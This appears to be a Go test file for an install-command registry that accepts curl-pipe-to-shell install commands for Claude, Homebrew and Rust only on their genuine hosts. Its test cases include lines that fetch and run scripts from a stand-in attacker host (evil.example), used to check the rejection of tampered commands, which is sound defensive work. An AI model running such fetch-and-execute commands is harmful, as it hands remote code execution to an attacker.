package installreg

import "testing"

func TestMatchCommand_Anthropic(t *testing.T) {
	// Canonical macOS install on the canonical host — must match.
	got := MatchCommand("docs.anthropic.com", "curl -fsSL https://claude.ai/install.sh | sh")
	if got == nil || got.Brand != "anthropic" {
		t.Fatalf("expected anthropic match, got %+v", got)
	}

	// Same command on an impersonator host — must NOT match (host gate).
	if got := MatchCommand("ravishingtattle.com", "curl -fsSL https://claude.ai/install.sh | sh"); got != nil {
		t.Errorf("expected no match on impersonator host, got %+v", got)
	}

	// Right host + tampered URL — must NOT match (TargetURLPattern gate).
	if got := MatchCommand("docs.anthropic.com", "curl -fsSL https://evil.example/install.sh | sh"); got != nil {
		t.Errorf("expected no match when target URL is wrong, got %+v", got)
	}

	// Right host + canonical URL + extra adjacent malicious URL — must NOT
	// match (the strict "any off-pattern URL kills the match" rule).
	if got := MatchCommand("docs.anthropic.com",
		"curl -fsSL https://claude.ai/install.sh | sh && curl https://evil.example/x"); got != nil {
		t.Errorf("expected no match when command also fetches a bad URL, got %+v", got)
	}

	// npm install — no URL form, no host mismatch.
	if got := MatchCommand("docs.anthropic.com", "npm install -g @anthropic-ai/claude-code"); got == nil {
		t.Errorf("expected npm template to match")
	}
}

func TestMatchCommand_Homebrew(t *testing.T) {
	cmd := `/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"`
	if got := MatchCommand("brew.sh", cmd); got == nil || got.Brand != "homebrew" {
		t.Errorf("expected homebrew match, got %+v", got)
	}
	// On an unrelated host.
	if got := MatchCommand("evil.tld", cmd); got != nil {
		t.Errorf("must reject homebrew install command on wrong host: %+v", got)
	}
}

func TestMatchCommand_Rust(t *testing.T) {
	cmd := `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
	if got := MatchCommand("rust-lang.org", cmd); got == nil || got.Brand != "rust-lang" {
		t.Errorf("expected rust-lang match, got %+v", got)
	}
	if got := MatchCommand("www.rust-lang.org", cmd); got == nil {
		t.Errorf("subdomain alias must match too")
	}
}

func TestMatchCommand_RejectsNoise(t *testing.T) {
	// Random shell command — must not match anything.
	if got := MatchCommand("docs.anthropic.com", "ls -la"); got != nil {
		t.Errorf("expected no match for noise, got %+v", got)
	}
	// Empty inputs.
	if got := MatchCommand("", "curl -fsSL https://claude.ai/install.sh | sh"); got != nil {
		t.Errorf("empty host must not match")
	}
	if got := MatchCommand("docs.anthropic.com", ""); got != nil {
		t.Errorf("empty command must not match")
	}
}

func TestHasTemplatesForHost(t *testing.T) {
	for _, h := range []string{
		"docs.anthropic.com", "brew.sh", "rust-lang.org", "www.rust-lang.org",
	} {
		if !HasTemplatesForHost(h) {
			t.Errorf("expected templates for %q", h)
		}
	}
	for _, h := range []string{
		"evil.example", "random.tld", "",
	} {
		if HasTemplatesForHost(h) {
			t.Errorf("expected NO templates for %q", h)
		}
	}
}

func TestRegistryNonTrivial(t *testing.T) {
	if Size() < 10 {
		t.Errorf("registry suspiciously small: %d", Size())
	}
}
